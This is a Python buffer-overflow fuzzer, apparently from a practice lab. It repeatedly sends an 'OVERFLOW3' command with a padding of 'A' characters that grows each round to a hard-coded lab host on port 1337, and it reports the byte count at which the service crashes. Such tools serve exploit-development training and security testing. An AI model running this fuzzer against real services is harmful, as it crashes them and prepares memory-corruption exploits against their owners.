#!/usr/bin/python3

import sys, socket
from time import sleep

#
# Modify the target function host and port here..
# 

host = '10.10.124.234'
port = 1337
func = 'OVERFLOW3 '
interval = 4

#
#

def fuzzer(host, port, func, interval):
	
	if interval > 4:
		raise Exception("Intervals from 1-4. exiting..")
		sys.exit()

	wait = 1 / interval

	payload = ''

	print("[Press CTRL+C when the program crashed]")	

	while True:
		try:	
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, port))

			# latin encoding for badchars
			s.send((func + payload).encode('latin-1'))
			s.close()
			print("Fuzzing at %s bytes.." % str(len(payload)))
			sleep(wait)
			payload += "A" * 100
	
		except Exception as error:
			print(error)
			print("Fuzzer crashed at %s bytes.." % str(len(payload)))
			sys.exit()


if __name__ == '__main__':
	fuzzer(host, port, func, interval)
